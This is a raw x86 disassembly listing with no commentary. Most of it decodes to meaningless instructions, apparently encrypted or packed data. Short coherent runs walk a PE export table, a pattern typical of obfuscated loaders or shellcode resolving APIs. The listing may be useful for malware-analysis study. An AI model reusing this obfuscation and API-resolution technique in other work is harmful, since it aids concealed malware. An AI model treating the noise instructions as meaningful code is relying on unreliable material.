  4030a7:	inc    ebp
  4030a8:	jg     0x4030ab
  4030aa:	jns    0x4030d6
  4030ac:	in     eax,0x9c
  4030ae:	adc    edi,DWORD PTR [edi-0x161a06a6]
  4030b4:	in     al,0x19
  4030b6:	aad    0x2f
  4030b8:	aas    
  4030b9:	sbb    ch,bh
  4030bb:	pop    ebp
  4030bc:	div    DWORD PTR [ecx+0x6]
  4030bf:	stos   DWORD PTR es:[edi],eax
  4030c0:	and    eax,0x6f3c2541
  4030c5:	jl     0x403058
  4030c7:	xchg   ebx,eax
  4030c8:	loopne 0x40306e
  4030ca:	fidiv  WORD PTR [edi]
  4030cc:	push   es
  4030cd:	das    
  4030ce:	(bad)
  4030d1:	mov    cl,bl
  4030d3:	das    
  4030d4:	or     ebp,DWORD PTR [edx]
  4030d6:	mov    bh,0x9b
  4030d8:	mov    bh,0x9
  4030da:	arpl   WORD PTR [ecx],cx
  4030dc:	sub    eax,0xfee4719a
  4030e1:	jle    0x40314c
  4030e3:	mov    dl,0xcc
  4030e5:	dec    ecx
  4030e6:	cwde   
  4030e7:	repz push es
  4030e9:	and    DWORD PTR [edi],0xffffffb6
  4030ec:	ficom  WORD PTR [edx-0x2b]
  4030ef:	sbb    ch,ah
  4030f1:	jecxz  0x4030de
  4030f3:	int    0x7
  4030f5:	test   al,0x3
  4030f7:	push   es
  4030f8:	inc    esi
  4030f9:	sub    al,0x80
  4030fb:	cmc    
  4030fc:	(bad)  
  4030fd:	lock adc DWORD PTR [esi],edi
  403100:	das    
  403101:	xor    bl,BYTE PTR [edx+edx*2]
  403104:	in     al,dx
  403105:	lock sub eax,DWORD PTR [edx+0x4f]
  403109:	xchg   edx,eax
  40310a:	cld    
  40310b:	stc    
  40310c:	dec    ecx
  40310d:	or     dl,BYTE PTR [edx-0x9]
  403110:	sbb    edx,edi
  403112:	lea    ebx,[esi]
  403114:	lahf   
  403115:	addr16 icebp 
  403117:	lods   al,BYTE PTR ds:[esi]
  403118:	add    DWORD PTR [eax+0x51],0x29
  40311c:	lahf   
  40311d:	pop    ds
  40311e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40311f:	aas    
  403120:	ds into 
  403122:	scas   eax,DWORD PTR es:[edi]
  403123:	stos   BYTE PTR es:[edi],al
  403124:	gs icebp 
  403126:	aam    0x9b
  403128:	xchg   ecx,eax
  403129:	and    esp,DWORD PTR ds:0x38a4fcaa
  40312f:	mov    edx,0xe0959bbe
  403134:	mov    edi,DWORD PTR [ebx+0x2a]
  403137:	push   0x4d
  403139:	(bad)  
  40313a:	ds cld 
  40313c:	sbb    dl,BYTE PTR [esi]
  40313e:	gs inc edx
  403140:	daa    
  403141:	lock sar bl,0xef
  403145:	cmp    esp,DWORD PTR [esi]
  403147:	int3   
  403148:	jmp    0x40312b
  40314a:	and    ch,bl
  40314c:	push   eax
  40314d:	arpl   ax,bp
  40314f:	pop    edi
  403151:	fnstcw WORD PTR [ecx-0x6b]
  403154:	xchg   esi,eax
  403155:	mov    ch,0x36
  403157:	add    BYTE PTR [eax],bh
  403159:	xor    eax,DWORD PTR [ebp+0x3e]
  40315c:	and    al,0xbe
  40315e:	pop    edx
  40315f:	bound  ebx,QWORD PTR [edx+0x71bf403b]
  403165:	int3   
  403166:	push   0x60a53bfa
  40316b:	adc    DWORD PTR [edx-0x795cbb4e],ecx
  403171:	cli    
  403172:	pushf  
  403173:	out    dx,eax
  403174:	sbb    BYTE PTR ds:[ebx+0x10f06e66],ah
  40317b:	loop   0x4031ac
  40317d:	or     bh,BYTE PTR [ecx]
  40317f:	cmp    edi,DWORD PTR [esi+0x33]
  403182:	stos   DWORD PTR es:[edi],eax
  403183:	lahf   
  403184:	adc    esi,DWORD PTR ds:0x5d306f18
  40318a:	cmc    
  40318b:	inc    ebx
  40318c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40318d:	sbb    DWORD PTR [ecx+0xe],edi
  403190:	test   eax,0xd5d35eb5
  403195:	mov    al,ds:0x605288f3
  40319a:	std    
  40319b:	xchg   edx,eax
  40319c:	shr    BYTE PTR [edx+0xb753c2d],1
  4031a2:	imul   ecx,DWORD PTR [esi],0xffffffc8
  4031a5:	push   eax
  4031a6:	jl     0x403181
  4031a8:	in     eax,dx
  4031a9:	pop    esi
  4031aa:	jne    0x403182
  4031ac:	lea    ebp,[ebp-0x43dab3ca]
  4031b2:	std    
  4031b3:	fldenv [ecx]
  4031b5:	dec    eax
  4031b6:	sub    DWORD PTR [ecx-0x53],ebp
  4031b9:	in     eax,dx
  4031ba:	shl    BYTE PTR [ecx+0x3f],0xd1
  4031be:	mov    ebp,0x502d289a
  4031c3:	xchg   BYTE PTR [eax-0x47],dh
  4031c6:	bound  ecx,QWORD PTR [eax+0x5c79f058]
  4031cc:	arpl   bx,sp
  4031ce:	inc    edx
  4031cf:	push   ebx
  4031d0:	inc    esp
  4031d1:	cmp    ch,ah
  4031d3:	adc    al,0xf5
  4031d5:	jnp    0x4031b4
  4031d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031d8:	mov    ds:0x519caef9,eax
  4031dd:	aas    
  4031de:	push   esi
  4031df:	outs   dx,DWORD PTR ds:[esi]
  4031e0:	ja     0x403243
  4031e2:	lahf   
  4031e3:	mov    WORD PTR [ebp+0x59],?
  4031e6:	call   0xd2414a0e
  4031eb:	sti    
  4031ec:	aam    0xba
  4031ee:	(bad)  [esi+ebp*4+0x76]
  4031f2:	adc    cl,BYTE PTR [edi+eiz*1+0x2708942f]
  4031f9:	fwait
  4031fa:	into   
  4031fb:	or     edx,0xcd146c57
  403201:	int    0xa1
  403203:	sub    DWORD PTR [ebp+0x21751d98],edx
  403209:	mov    eax,0x20bb99a6
  40320e:	push   ss
  40320f:	cmp    DWORD PTR [edx-0xe599f0e],0x56c7695a
  403219:	pop    esp
  40321a:	push   ebp
  40321b:	jmp    0x4031ca
  40321d:	dec    edi
  40321e:	test   DWORD PTR [eax+eax*8],ecx
  403221:	sbb    dl,bh
  403223:	and    eax,eax
  403225:	sub    eax,0x3f37ddb8
  40322a:	enter  0xb15,0xd6
  40322e:	pop    ds
  40322f:	xchg   edx,eax
  403230:	int3   
  403231:	lahf   
  403232:	imul   esi,DWORD PTR [eax+ebp*8],0x79
  403236:	push   es
  403237:	pop    esi
  403238:	fidivr DWORD PTR [esi-0x16]
  40323b:	pusha  
  40323c:	or     esi,esp
  40323e:	or     al,0xef
  403240:	xchg   esp,eax
  403241:	pop    edx
  403242:	(bad)  
  403243:	iret   
  403244:	pusha  
  403245:	cs cmp al,0x5a
  403248:	pusha  
  403249:	jmp    0xdb9635b5
  40324e:	mov    cl,0x4b
  403250:	ror    BYTE PTR [ebp-0x37ab8402],0x7d
  403257:	mul    BYTE PTR [ecx+ebx*8+0x3b]
  40325b:	lahf   
  40325c:	int    0x24
  40325e:	cs dec esi
  403260:	mov    dl,0x79
  403262:	inc    esp
  403263:	adc    ah,BYTE PTR [edx-0x56]
  403266:	mov    WORD PTR [edi+0x27],cs
  403269:	push   ss
  40326a:	mov    ah,0x7d
  40326c:	jmp    0x4032b2
  40326e:	xchg   esp,eax
  40326f:	jo     0x4032cc
  403271:	loop   0x403236
  403273:	jne    0x403201
  403275:	and    DWORD PTR [ecx+0x1076374c],esi
  40327b:	jbe    0x403203
  40327d:	mov    esi,0x9d63d0e7
  403282:	imul   ebp,DWORD PTR [esi+0x2f],0x42
  403286:	or     cl,BYTE PTR [eax+0x6b60384f]
  40328c:	mov    ch,0x86
  40328e:	cmp    DWORD PTR [ebp+0x6feea351],edi
  403294:	jns    0x403234
  403296:	sar    DWORD PTR [bx+di-0x4f42],1
  40329b:	inc    ecx
  40329c:	xchg   BYTE PTR [edi],dl
  40329e:	fldenv [ebp+ebp*8+0x1d]
  4032a2:	mov    ss,WORD PTR [ebx]
  4032a4:	jne    0x40330d
  4032a6:	sbb    eax,0x1d346d41
  4032ab:	aad    0xe
  4032ad:	in     al,dx
  4032ae:	out    dx,al
  4032af:	and    eax,0xb154c650
  4032b4:	xor    edi,ecx
  4032b6:	mov    eax,ds:0x46db0b1
  4032bb:	cld    
  4032bc:	push   esp
  4032bd:	mov    al,ds:0x8deaa125
  4032c2:	cdq    
  4032c3:	rcl    DWORD PTR [di-0x5257],cl
  4032c8:	push   ds
  4032c9:	leave  
  4032ca:	test   DWORD PTR [ebp+0x50b866c0],edx
  4032d0:	fdiv   DWORD PTR [ebp-0x139f7236]
  4032d6:	and    edx,DWORD PTR [ebx]
  4032d8:	dec    ebx
  4032d9:	mov    ch,0xb1
  4032db:	test   al,0x62
  4032dd:	scas   eax,DWORD PTR es:[edi]
  4032de:	pop    esp
  4032df:	cmp    al,0x3c
  4032e1:	push   0xba07ca30
  4032e6:	aas    
  4032e7:	add    ecx,ebp
  4032e9:	mov    DWORD PTR [edi-0x6cc9559d],ecx
  4032ef:	lods   al,BYTE PTR ds:[esi]
  4032f0:	aam    0x85
  4032f2:	mov    gs,WORD PTR [eax]
  4032f4:	das    
  4032f5:	mov    esi,0xd73f19f0
  4032fa:	jb     0x40332e
  4032fc:	cwde   
  4032fd:	cmp    al,0x90
  4032ff:	out    dx,al
  403300:	rcr    BYTE PTR [edi+ebp*4],1
  403303:	loop   0x4032ed
  403305:	jb     0x4032e8
  403307:	dec    ebp
  403308:	sar    DWORD PTR [edi-0x615237b0],cl
  40330e:	adc    esp,DWORD PTR [ebx+0x56]
  403311:	jae    0x40333c
  403313:	icebp  
  403314:	out    dx,eax
  403315:	cmp    eax,0xef842e85
  40331a:	pop    ds
  40331b:	push   ds
  40331c:	mov    es,ebx
  40331e:	imul   edi,esp,0x4ca50e95
  403324:	arpl   WORD PTR [ebx],si
  403326:	mov    BYTE PTR [ebx],0xc7
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx+0x6ac23cb6]
  403372:	cmp    al,0x69
  403374:	dec    ecx
  403375:	adc    BYTE PTR [edx],bl
  403377:	js     0x4033f1
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x403336
  40337e:	aaa    
  40337f:	ds ja  0x4033ec
  403382:	inc    ecx
  403383:	pop    ebp
  403384:	add    ebp,DWORD PTR [ebx+0x21]
  403387:	dec    ebx
  403388:	std    
  403389:	mov    dl,0xc7
  40338b:	inc    edx
  40338c:	addr16 aaa 
  40338e:	retf   
  40338f:	(bad)  
  403390:	jo     0x40336a
  403392:	dec    ecx
  403393:	adc    eax,0xfb1c5d22
  403398:	out    0xd0,al
  40339a:	cmp    al,0xc3
  40339c:	cld    
  40339d:	xchg   edx,eax
  40339e:	push   0x4fa071b4
  4033a3:	ror    ecx,1
  4033a5:	inc    esi
  4033a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033a7:	jmp    0xee5f:0xc659453f
  4033ae:	xlat   BYTE PTR ds:[ebx]
  4033af:	push   esi
  4033b0:	mov    WORD PTR [esi],es
  4033b2:	cmp    edx,DWORD PTR [edi]
  4033b4:	fs xor ebp,edi
  4033b7:	xor    ah,BYTE PTR [edx-0x5b]
  4033ba:	pusha  
  4033bb:	cmp    esi,edx
  4033bd:	jmp    0x40335b
  4033bf:	dec    esp
  4033c0:	jmp    0x4033bc
  4033c2:	xchg   esi,eax
  4033c3:	outs   dx,DWORD PTR ds:[esi]
  4033c4:	je     0x40342d
  4033c6:	cs das 
  4033c8:	sbb    DWORD PTR [esp+eiz*4-0x63],ebx
  4033cc:	dec    edi
  4033cd:	push   edi
  4033ce:	xchg   edx,eax
  4033cf:	lock inc edi
  4033d1:	in     eax,dx
  4033d2:	fwait
  4033d3:	lods   eax,DWORD PTR ds:[esi]
  4033d4:	sub    ah,dh
  4033d6:	addr16 mov ds:0x5039,eax
  4033da:	js     0x4033e9
  4033dc:	pop    ebx
  4033dd:	div    BYTE PTR [edi+edi*2+0x24]
  4033e1:	mov    al,ds:0x22bb52da
  4033e6:	or     esi,DWORD PTR [ebx+eax*4]
  4033e9:	pop    esi
  4033ea:	xor    edx,DWORD PTR [ebx]
  4033ec:	call   0x3907:0x3129d3a6
  4033f3:	add    BYTE PTR [ebp+0x7a030d40],0x51
  4033fa:	xchg   ecx,eax
  4033fb:	ins    DWORD PTR es:[edi],dx
  4033fc:	or     bh,BYTE PTR [ebx+0x23]
  4033ff:	xsaves [ecx+eax*2-0x3f]
  403404:	add    DWORD PTR [esi-0xf89b277],edx
  40340a:	add    ecx,ecx
  40340c:	stos   BYTE PTR es:[edi],al
  40340d:	sub    eax,0x89c831c5
  403412:	mov    DWORD PTR [ebx-0x3f],ebx
  403415:	adc    al,BYTE PTR [ebp-0x53c82f7d]
  40341b:	ja     0x4033d5
  40341d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40341e:	out    0x2d,al
  403420:	jmpw   0xe8a1
  403424:	xchg   ebx,eax
  403425:	sbb    BYTE PTR [esi+0x4a],0xd2
  403429:	(bad)  
  40342a:	fiadd  DWORD PTR [eax+0x16]
  40342d:	xchg   BYTE PTR [ebx+ecx*4],dl
  403430:	test   edx,ecx
  403432:	rcr    DWORD PTR [ebp-0x64],cl
  403435:	mov    al,ds:0x7cdb80d4
  40343a:	xor    al,0x6e
  40343c:	jecxz  0x4033f2
  40343e:	aas    
  40343f:	fisub  DWORD PTR [edi-0x41db9e94]
  403445:	iret   
  403446:	imul   esi,DWORD PTR [ebp-0x1c],0xb989c591
  40344d:	cmp    edx,ebp
  40344f:	xor    dh,ah
  403451:	test   al,0x49
  403453:	mov    ds:0x6911e4ea,al
  403458:	sbb    esi,DWORD PTR [ebp-0x7b6827ca]
  40345e:	push   es
  40345f:	rol    DWORD PTR [edx-0x13a8c9c1],cl
  403465:	jmp    0x4033ed
  403467:	mov    ds:0x8f111dca,al
  40346c:	data16 jbe 0x4034a2
  40346f:	mov    ebx,0xab58bf69
  403474:	push   ss
  403475:	mov    eax,0xd381486
  40347a:	icebp  
  40347b:	call   0x4d5e:0x7e167986
  403482:	enter  0x1230,0x90
  403486:	inc    eax
  403487:	imul   ebx,DWORD PTR [esi+eiz*4],0x58
  40348b:	jnp    0x40344a
  40348d:	inc    ebx
  40348e:	in     eax,0x42
  403490:	shr    BYTE PTR [ebx+0x1076b23e],1
  403496:	mov    bh,0x5c
  403498:	xor    esp,DWORD PTR [edx+0x1a78a006]
  40349e:	mov    esi,0xa93b8954
  4034a3:	hlt    
  4034a4:	inc    edx
  4034a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034a6:	bound  eax,QWORD PTR [ecx]
  4034a8:	pop    es
  4034a9:	test   eax,0x19a033e3
  4034ae:	lods   al,BYTE PTR ds:[esi]
  4034af:	xor    BYTE PTR [edx],dh
  4034b1:	outs   dx,BYTE PTR cs:[esi]
  4034b3:	rol    cl,1
  4034b5:	sbb    eax,0x55c54414
  4034ba:	add    eax,0x70fb1cfd
  4034bf:	iret   
  4034c0:	xchg   DWORD PTR [ebp+edx*1+0xb8f24cb],esi
  4034c7:	jnp    0x403510
  4034c9:	out    0xdd,eax
  4034cb:	into   
  4034cc:	dec    edi
  4034cd:	mov    ebp,0x108e85a2
  4034d2:	test   eax,0xdc500692
  4034d7:	or     ah,BYTE PTR [eax+0x1e3649a4]
  4034dd:	sbb    eax,0xa74541be
  4034e2:	jp     0x40350f
  4034e4:	xchg   esp,eax
  4034e5:	jp     0x4034aa
  4034e7:	inc    ebp
  4034e8:	jge    0x40349e
  4034ea:	cld    
  4034eb:	adc    eax,DWORD PTR [esi]
  4034ed:	mov    ch,0xb
  4034ef:	pop    edx
  4034f0:	or     esi,esp
  4034f2:	pop    ebx
  4034f3:	adc    dh,bl
  4034f5:	adc    BYTE PTR [esi+edx*1],dh
  4034f8:	arpl   WORD PTR [ebp+0x20],bp
  4034fb:	or     al,0xd9
  4034fd:	addr16 jp 0x4034fb
  403500:	and    bl,BYTE PTR [ebx]
  403502:	add    al,0x72
  403504:	scas   al,BYTE PTR es:[edi]
  403505:	push   ebp
  403506:	inc    esp
  403507:	fs and al,0x7b
  40350a:	and    eax,0x53d6121b
  40350f:	pop    edx
  403510:	jecxz  0x403555
  403512:	rcr    DWORD PTR [ebx],cl
  403514:	mov    al,ds:0x20fd9973
  403519:	mov    al,ds:0xf8280a58
  40351e:	adc    BYTE PTR [ecx-0x42],dh
  403521:	adc    DWORD PTR [edx+0x19],edi
  403524:	push   ss
  403525:	loope  0x40353e
  403527:	gs dec esi
  403529:	ret    0x677a
  40352c:	mov    ds:0xf67fcb1e,al
  403531:	sti    
  403532:	addr16 pop esp
  403534:	loop   0x403533
  403536:	dec    ebp
  403537:	(bad)  
  403538:	pop    ebp
  403539:	pop    edi
  40353a:	shrd   DWORD PTR [ecx],edx,0x17
  40353e:	mov    ebp,0x68820cd9
  403543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403544:	loop   0x403501
  403546:	loop   0x403504
  403548:	pushf  
  403549:	push   0x77ccad30
  40354e:	retf   0xd9a5
  403551:	xchg   edx,eax
  403552:	push   ecx
  403553:	or     al,0x78
  403555:	ja     0x4035be
  403557:	pushf  
  403558:	ret    
  403559:	lahf   
  40355a:	outs   dx,DWORD PTR ds:[esi]
  40355b:	push   ds
  40355c:	mul    DWORD PTR fs:[ebx]
  40355f:	inc    eax
  403560:	adc    BYTE PTR [edi-0x2cfa0bc7],ch
  403566:	loop   0x4035c5
  403568:	mov    ds:0xc6860ca0,eax
  40356d:	add    dl,BYTE PTR [ecx-0x4e]
  403570:	mov    ch,0xfd
  403572:	neg    BYTE PTR [eax-0x2ba41c38]
  403578:	sub    eax,0x2c6a6234
  40357d:	ret    0x9d0f
  403580:	es lock sub al,0x17
  403584:	mov    bh,0x17
  403586:	or     dh,bl
  403588:	int3   
  403589:	push   eax
  40358a:	int3   
  40358b:	or     eax,0x5f0a65fe
  403590:	enter  0x98ab,0xb6
  403594:	add    BYTE PTR [edx-0x171dd073],dl
  40359a:	sub    al,0x30
  40359c:	call   0xb5059950
  4035a1:	pop    edx
  4035a2:	xor    eax,edx
  4035a4:	sub    dl,BYTE PTR [ebp-0x3]
  4035a7:	fs mov esp,0x23693b38
  4035ad:	rol    DWORD PTR [ecx+0x275358a5],1
  4035b3:	push   0xc312f094
  4035b8:	push   ss
  4035b9:	in     eax,0xa5
  4035bb:	dec    edi
  4035bc:	clc    
  4035bd:	ficomp DWORD PTR [edi+0x30b0a21]
  4035c3:	xor    al,0x62
  4035c5:	xor    DWORD PTR [edi-0x38629145],edx
  4035cb:	xchg   ebp,eax
  4035cc:	je     0x4035bd
  4035ce:	adc    eax,0x234123d8
  4035d3:	mov    ebp,0xd98152ee
  4035d8:	scas   eax,DWORD PTR es:[edi]
  4035d9:	inc    edi
  4035da:	pop    es
  4035db:	fs ins BYTE PTR es:[edi],dx
  4035dd:	imul   ebx,edi,0x77
  4035e0:	lods   eax,DWORD PTR ds:[esi]
  4035e1:	mov    dl,0x2d
  4035e3:	jmp    0x1f69:0xf962d3cf
  4035ea:	(bad)  
  4035eb:	(bad)  
  4035ec:	jecxz  0x4035bb
  4035ee:	mov    ch,0x49
  4035f0:	push   es
  4035f1:	(bad)  
  4035f2:	loopne 0x403662
  4035f4:	hlt    
  4035f5:	pop    ecx
  4035f6:	push   ebx
  4035f7:	mov    bl,0x45
  4035f9:	xchg   esp,eax
  4035fa:	test   al,0x82
  4035fc:	(bad)  
  4035fd:	pandn  mm6,QWORD PTR [ebx]
  403600:	mov    BYTE PTR [ebx],0xc7
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x7784dc5d,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x40363b
  40363f:	adc    DWORD PTR [ebp+0x33],0xffffff89
  403643:	xchg   esi,eax
  403644:	sbb    eax,0xf10d3533
  403649:	adc    esi,DWORD PTR [eax+0x747f0baa]
  40364f:	dec    ecx
  403650:	ror    ebp,1
  403652:	pushf  
  403653:	cmp    bl,dl
  403655:	mov    ?,WORD PTR [esi-0x2189dd38]
  40365b:	hlt    
  40365c:	ins    BYTE PTR es:[edi],dx
  40365d:	sbb    esp,DWORD PTR [ecx]
  40365f:	mov    edx,0x3c260922
  403664:	fdiv   st(4),st
  403666:	popf   
  403667:	fidivr DWORD PTR [edi]
  403669:	mov    edx,0x927fd8fa
  40366e:	inc    ebx
  40366f:	loope  0x40360b
  403671:	mov    ds,WORD PTR [edx]
  403673:	fimul  DWORD PTR ds:0xa893ca5f
  403679:	pop    esi
  40367a:	outs   dx,DWORD PTR ds:[esi]
  40367b:	push   esp
  40367c:	loop   0x4036f2
  40367e:	dec    ecx
  40367f:	stc    
  403680:	pop    esp
  403681:	sbb    ebp,DWORD PTR [esi+ecx*4+0xbfa905e]
  403688:	xor    ah,0x15
  40368b:	dec    eax
  40368c:	and    dl,al
  40368e:	sar    BYTE PTR [ebx+0x12],0x11
  403692:	sub    eax,0x2c65666
  403697:	xchg   edx,eax
  403698:	mov    esp,0xe33d0795
  40369d:	pop    ecx
  40369e:	aaa    
  40369f:	jg     0x40364b
  4036a1:	loopne 0x4036e2
  4036a3:	ins    DWORD PTR es:[edi],dx
  4036a4:	neg    DWORD PTR [eax+0x64]
  4036a7:	in     al,0x40
  4036a9:	cdq    
  4036aa:	dec    esi
  4036ab:	enter  0xfd64,0xd0
  4036af:	sbb    DWORD PTR [ecx],eax
  4036b1:	pop    ebp
  4036b2:	sub    BYTE PTR ds:0xcce4f45d,al
  4036b8:	cmp    BYTE PTR gs:[edi],0xa0
  4036bc:	xchg   ebp,eax
  4036bd:	mov    ebp,0x2279b21b
  4036c2:	popf   
  4036c3:	ds mov ebx,0x41a8a93
  4036c9:	inc    edx
  4036ca:	adc    dl,BYTE PTR [ebp-0x3531877a]
  4036d0:	pop    esi
  4036d1:	outs   dx,DWORD PTR ds:[esi]
  4036d2:	into   
  4036d3:	mov    bh,BYTE PTR [ebx+0x65]
  4036d6:	jmp    0x3387:0x9fe316f1
  4036dd:	xchg   esi,eax
  4036de:	pop    ebp
  4036df:	mov    esi,0xe3e963ce
  4036e4:	les    ebx,FWORD PTR [eax+0x30]
  4036e7:	pop    DWORD PTR [ebx]
  4036e9:	popf   
  4036ea:	sbb    ch,BYTE PTR [ebx]
  4036ec:	pop    edx
  4036ed:	test   eax,0xc30b41f1
  4036f2:	shl    esi,cl
  4036f4:	(bad)  
  4036f6:	out    0xc1,al
  4036f8:	push   0x2aff65a3
  4036fd:	shl    ah,cl
  4036ff:	xor    al,dh
  403701:	sub    esp,DWORD PTR [ebx-0x302568d1]
  403707:	pop    esi
  403708:	(bad)  
  40370a:	jo     0x403732
  40370c:	adc    ch,BYTE PTR [edi-0x7ae13871]
  403712:	pop    ebp
  403713:	hlt    
  403714:	out    0x30,eax
  403716:	shl    BYTE PTR ds:0xa8549d98,1
  40371c:	loope  0x4036c3
  40371e:	sbb    DWORD PTR [eax-0x223365a2],eax
  403724:	jbe    0x403737
  403726:	mov    dh,0xd0
  403728:	pusha  
  403729:	pop    edi
  40372a:	lods   eax,DWORD PTR ds:[esi]
  40372b:	jo     0x403785
  40372d:	adc    DWORD PTR [esp+eax*1-0x32],ebx
  403731:	push   edi
  403732:	and    BYTE PTR [eax+0x350df01a],0xfb
  403739:	rcr    dh,cl
  40373b:	loop   0x40373d
  40373d:	fild   DWORD PTR [edi-0x69363008]
  403743:	int    0xcb
  403745:	retf   0x5df7
  403748:	sbb    DWORD PTR [esi+0x51],ebx
  40374b:	cs xchg esi,eax
  40374d:	sub    eax,0xf5eade12
  403752:	sub    al,0x64
  403754:	adc    eax,0xea1fed75
  403759:	cmp    edx,eax
  40375b:	into   
  40375c:	mov    BYTE PTR [eax+0x158ebbdf],dh
  403762:	xor    BYTE PTR [edi+0x39bab446],ch
  403768:	xchg   esi,eax
  403769:	xchg   edi,eax
  40376a:	out    dx,eax
  40376b:	xchg   ecx,eax
  40376c:	stos   BYTE PTR es:[edi],al
  40376d:	out    0x25,eax
  40376f:	mov    al,ds:0x85a4af8f
  403774:	push   ss
  403775:	hlt    
  403776:	popa   
  403777:	hlt    
  403778:	dec    ecx
  403779:	sbb    al,0x4e
  40377b:	jo     0x4037c4
  40377d:	jne    0x4037be
  40377f:	aam    0x38
  403781:	or     DWORD PTR [edx-0x64c70d5e],esp
  403787:	retf   
  403788:	ret    0x6022
  40378b:	dec    ebp
  40378c:	shr    bl,cl
  40378e:	jle    0x403803
  403790:	sub    al,0x66
  403792:	mov    ds:0xf0baad6d,eax
  403797:	pop    es
  403798:	fmul   st,st(4)
  40379a:	xchg   ebx,eax
  40379b:	shl    BYTE PTR [eax],0x4
  40379e:	loop   0x403753
  4037a0:	repnz cdq 
  4037a2:	(bad)  
  4037a3:	cmp    eax,0x30944ca
  4037a8:	jae    0x403740
  4037aa:	lods   eax,DWORD PTR ds:[esi]
  4037ab:	inc    eax
  4037ac:	aad    0x33
  4037ae:	in     al,dx
  4037af:	leave  
  4037b0:	(bad)  
  4037b2:	add    al,0x34
  4037b4:	jle    0x403787
  4037b6:	fnstenv [eax+0x54a1c4d9]
  4037bc:	je     0x403757
  4037be:	xlat   BYTE PTR ds:[ebx]
  4037bf:	and    al,0x79
  4037c1:	in     eax,dx
  4037c2:	inc    ecx
  4037c3:	pop    ds
  4037c4:	jp     0x4037a8
  4037c6:	or     ebx,DWORD PTR [ecx-0x4fc0aeaf]
  4037cc:	pop    edi
  4037cd:	fwait
  4037ce:	pop    esp
  4037cf:	lds    esp,FWORD PTR [ebx+edx*4+0x6f]
  4037d3:	int    0x2f
  4037d5:	pop    eax
  4037d6:	inc    eax
  4037d7:	add    DWORD PTR [edi+0x2a4eb7e6],0x48e8cb70
  4037e1:	push   es
  4037e2:	iret   
  4037e3:	push   ebx
  4037e4:	les    ebp,FWORD PTR [esp+esi*8]
  4037e7:	les    edi,FWORD PTR [edi-0x4]
  4037ea:	adc    ah,cl
  4037ec:	dec    edx
  4037ed:	test   al,0x2d
  4037ef:	sub    BYTE PTR [edi+0x50e7bec9],0x1d
  4037f6:	repnz rcr DWORD PTR [edx],0x43
  4037fa:	xor    edi,DWORD PTR [edi]
  4037fc:	sbb    esi,esi
  4037fe:	in     al,dx
  4037ff:	out    dx,al
  403800:	jae    0x403865
  403802:	sbb    eax,0x594d77ef
  403807:	cmp    BYTE PTR ds:0x329cbf11,ah
  40380d:	sub    BYTE PTR [ebp+0x50ae042f],dl
  403813:	ins    BYTE PTR es:[edi],dx
  403814:	jle    0x40387f
  403816:	adc    esp,edi
  403818:	ja     0x40385d
  40381a:	test   DWORD PTR [ebx+0x1c34675],ebx
  403820:	add    al,0xad
  403822:	outs   dx,BYTE PTR ds:[esi]
  403823:	and    al,0x3a
  403825:	(bad)  
  403826:	jmp    0x403800
  403828:	adc    ecx,DWORD PTR [edx]
  40382a:	jb     0x4037d7
  40382c:	in     al,0xdf
  40382e:	(bad)  
  40382f:	xchg   ecx,eax
  403830:	xor    DWORD PTR [edi+0x53a1114f],ecx
  403836:	rcl    BYTE PTR [esi-0xe],cl
  403839:	test   DWORD PTR [ebx+ebx*8],ecx
  40383c:	sbb    al,0xee
  40383e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40383f:	test   al,0xdb
  403841:	and    bl,BYTE PTR [esi]
  403843:	ds out 0xf0,al
  403846:	js     0x403883
  403848:	repz inc ecx
  40384a:	push   0xd4e558d8
  40384f:	call   0xb6b3:0x97edfa5d
  403856:	hlt    
  403857:	sahf   
  403858:	ins    DWORD PTR es:[edi],dx
  403859:	mov    esi,0x4f1f3482
  40385e:	adc    eax,0xbfd38db
  403863:	or     cl,al
  403865:	push   es
  403866:	rcl    BYTE PTR [eax+eax*4],0xd9
  40386a:	repnz out 0x2a,al
  40386d:	shr    DWORD PTR [esi+0x70],cl
  403870:	rcl    ch,0x93
  403873:	xchg   edx,eax
  403874:	daa    
  403875:	xchg   esp,eax
  403876:	xor    al,0xba
  403878:	pminsw mm3,QWORD PTR [ebx+edi*2-0x12]
